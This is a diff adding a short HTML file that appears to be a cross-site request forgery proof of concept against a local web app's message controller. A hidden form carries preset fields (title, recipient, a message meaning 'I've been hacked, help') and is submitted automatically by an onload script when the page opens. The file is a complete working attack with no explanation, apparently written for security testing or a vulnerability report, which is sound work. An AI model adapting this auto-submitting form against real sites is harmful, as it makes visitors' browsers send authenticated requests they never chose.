@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form name="csrf_form" method="POST" action="http://localhost:8000/controllers/MessageController.php">
+        <input type="text" name="title" value="CSRF POC Woho 1234" />
+        <input type="text" name="recipient" value="1" />
+        <input type="text" name="message" value="Saya dihek tolong" />
+        <input type="text" name="send_message" value="1" />
+    </form>
+</body>
+<script>
+    window.onload = function() {
+        document.forms['csrf_form'].submit();
+    }
+</script>
+</html>
